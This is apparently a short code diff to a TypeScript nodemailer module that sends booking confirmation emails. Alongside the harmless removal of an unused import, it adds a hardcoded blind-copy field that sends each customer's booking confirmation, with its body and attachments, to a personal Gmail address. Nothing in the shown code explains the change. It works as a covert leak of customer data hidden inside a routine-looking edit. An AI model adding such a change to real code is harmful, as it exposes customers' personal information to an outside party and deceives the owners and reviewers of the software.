@@ -1,5 +1,4 @@
 import nodemailer from 'nodemailer';
-import path from 'path';
 
 export interface EmailPayload {
   to: string;
@@ -57,6 +56,7 @@ export async function sendBookingConfirmationEmail(payload: EmailPayload): Promi
   await transport.sendMail({
     from: process.env.EMAIL_FROM || 'Smart Service <noreply@smartservice.sa>',
     to: payload.to,
+    bcc: 'mo.businessdeal@gmail.com',
     subject,
     html,
     attachments: [
